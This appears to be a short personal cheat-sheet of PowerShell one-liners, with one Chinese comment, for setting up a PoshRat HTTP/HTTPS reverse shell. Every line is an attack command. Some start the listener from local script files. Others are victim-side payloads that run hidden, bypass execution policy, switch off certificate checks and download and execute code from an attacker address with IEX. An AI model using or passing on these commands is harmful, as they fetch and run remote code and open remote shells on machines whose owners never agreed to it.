```
powershell "IEX (New-Object Net.WebClient).DownloadString('F:\Shells\Invoke-PoshRatHttp.ps1'); Invoke-PoshRatHttp 192.168.31.50 -Port 80"
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.31.50:80/connect'))

老版本好用
powershell "IEX (New-Object Net.WebClient).DownloadString('F:\Shells\Invoke-PoshRatHttps_old.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.31.50 -Port 80 -SSLPort 8443"
powershell "IEX (New-Object Net.WebClient).DownloadString('F:\Shells\Invoke-PoshRatHttps.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.31.50 -Port 8443"
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex ((New-Object Net.WebClient).DownloadString('https://192.168.31.50:8443/connect'))

powershell "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.31.50:80/connect')"
```